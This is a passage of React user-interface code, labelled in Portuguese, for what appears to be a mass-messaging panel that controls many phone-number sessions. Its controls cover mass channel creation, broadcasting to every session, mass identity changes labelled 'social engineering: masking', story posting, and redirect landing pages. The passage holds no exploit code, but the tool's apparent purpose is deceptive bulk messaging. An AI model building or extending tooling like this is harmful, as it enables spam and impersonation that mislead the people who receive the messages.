                            <Button variant="secondary" onClick={() => setSelectedChannelPhones(new Set(sessions.map(s=>s.phone_number)))}>Vincular Sessões</Button>
                            <Button variant="primary" icon={DocumentPlusIcon} onClick={massCreateChannelsV3} disabled={massCreating || !massChannelPrefix}>Pipeline V3</Button>
                            <Button variant="secondary" onClick={massCreateChannelsV2} disabled={massCreating || !massChannelPrefix}>Pipeline V2</Button>
                        </div>
                        
                        <div style={{ borderTop: '1px solid #1F1F1F', paddingTop: '24px', marginBottom: '32px' }}>
                            <h3 style={{ margin: '0 0 16px 0', fontSize: '14px', fontWeight: '500' }}>Ponte de Broadcast Global</h3>
                            <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '16px', marginBottom: '16px' }}>
                                <textarea value={channelMessage} onChange={e=>setChannelMessage(e.target.value)} placeholder="Defina a string do payload..." style={{ width:'100%', height:'80px', background:'#000', color:'#EDEDED', border:'1px solid #1F1F1F', padding:'12px', borderRadius:'6px', fontSize:'13px', resize:'none', outline:'none' }} />
                                <div>
                                    <Input placeholder="Anexo Binário (URL)" value={channelMediaUrl} onChange={e=>setChannelMediaUrl(e.target.value)} style={{marginBottom: '16px'}} />
                                    <Button variant="secondary" icon={PaperAirplaneIcon} onClick={massBroadcastChannels} disabled={broadcastingChannel || !channelMessage} style={{width: '100%'}}>TRANSMITIR EM TODOS OS NÓS</Button>
                                </div>
                            </div>
                        </div>

                        <div style={{ borderTop: '1px solid #1F1F1F', paddingTop: '24px' }}>
                            <div style={{ display:'flex', justifyContent:'space-between', alignItems:'center', marginBottom: '16px' }}>
                                <div style={{ fontSize: '12px', color: '#8B949E' }}>Topologia Criada ({channels.length})</div>
                                <Button variant="secondary" onClick={() => setSelectedChannelsForBroadcast(new Set(channels.map(c=>c.id)))} style={{ padding: '6px 12px', fontSize: '11px' }}>Selecionar Todos</Button>
                            </div>
                            <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fill, minmax(250px, 1fr))', gap: '16px' }}>
                                {channels.map(channel => (
                                    <div key={channel.id} style={{ background: selectedChannelsForBroadcast.has(channel.id) ? '#141414' : '#000', border: selectedChannelsForBroadcast.has(channel.id) ? '1px solid #333' : '1px solid #1F1F1F', borderRadius: '6px', padding: '16px', cursor: 'pointer' }} onClick={() => {
                                        const newSet = new Set(selectedChannelsForBroadcast);
                                        newSet.has(channel.id) ? newSet.delete(channel.id) : newSet.add(channel.id);
                                        setSelectedChannelsForBroadcast(newSet);
                                    }}>
                                        <div style={{ fontSize: '13px', color: '#EDEDED', fontWeight: '500' }}>{channel.channel_name}</div>
                                        <div style={{ fontSize: '11px', color: '#8B949E', marginTop: '4px' }}>{channel.total_members} nós ativos</div>
                                    </div>
                                ))}
                            </div>
                        </div>
                    </Card>
                )}

                {/* ABA FERRAMENTAS */}
                {tab === 'tools' && (
                    <div style={{ display:'grid', gridTemplateColumns:'1fr 1fr', gap:'24px' }}>
                        {isAdmin && (
                            <Card>
                                <h3 style={{ margin: '0 0 24px 0', fontSize: '14px', fontWeight: '500' }}>Administração: Emitir Credencial</h3>
                                <Input placeholder="Identificador (Username)" value={newUserUsername} onChange={e=>setNewUserUsername(e.target.value)} style={{marginBottom: '12px'}} />
                                <Input placeholder="Chave Criptográfica" type="password" value={newUserPassword} onChange={e=>setNewUserPassword(e.target.value)} style={{marginBottom: '12px'}} />
                                <Input placeholder="Vetor de Redirecionamento" value={newUserRedirectUrl} onChange={e=>setNewUserRedirectUrl(e.target.value)} style={{marginBottom: '24px'}} />
                                <Button variant="primary" onClick={handleCreateUser} style={{width: '100%'}}>GERAR ACESSO</Button>
                            </Card>
                        )}
                        <Card>
                            <h3 style={{ margin: '0 0 24px 0', fontSize: '14px', fontWeight: '500' }}>Engenharia Social: Masking</h3>
                            <Input placeholder="Alias Global" value={newName} onChange={e=>setNewName(e.target.value)} style={{marginBottom: '12px'}} />
                            <Input placeholder="Avatar Blob URL" value={photoUrl} onChange={e=>setPhotoUrl(e.target.value)} style={{marginBottom: '24px'}} />
                            <Button variant="secondary" onClick={handleMassUpdateProfile} disabled={processing} style={{width: '100%'}}>INJETAR IDENTIDADE</Button>
                        </Card>
                        <Card>
                            <h3 style={{ margin: '0 0 24px 0', fontSize: '14px', fontWeight: '500' }}>Engenharia Social: Stories</h3>
                            <Input placeholder="Asset URL" value={storyUrl} onChange={e=>setStoryUrl(e.target.value)} style={{marginBottom: '12px'}} />
                            <Input placeholder="Subtítulo Tático" value={storyCaption} onChange={e=>setStoryCaption(e.target.value)} style={{marginBottom: '24px'}} />
                            <Button variant="secondary" onClick={handleMassPostStory} disabled={processing} style={{width: '100%'}}>DISSEMINAR ASSET</Button>
                        </Card>
                        {!isAdmin && (
                            <Card>
                                <h3 style={{ margin: '0 0 24px 0', fontSize: '14px', fontWeight: '500' }}>Configurações Pessoais</h3>
                                <Input placeholder="Vetor de Redirecionamento (Pressel)" value={myRedirectUrl} onChange={e=>setMyRedirectUrl(e.target.value)} style={{marginBottom: '24px'}} />
                                <Button variant="secondary" onClick={handleSaveRedirectUrl} disabled={savingRedirect} style={{width: '100%'}}>GRAVAR ROTAS</Button>
                            </Card>
                        )}
                    </div>
                )}
                
            </motion.div>
        </AnimatePresence>
        </div>
    </div>
  );
}
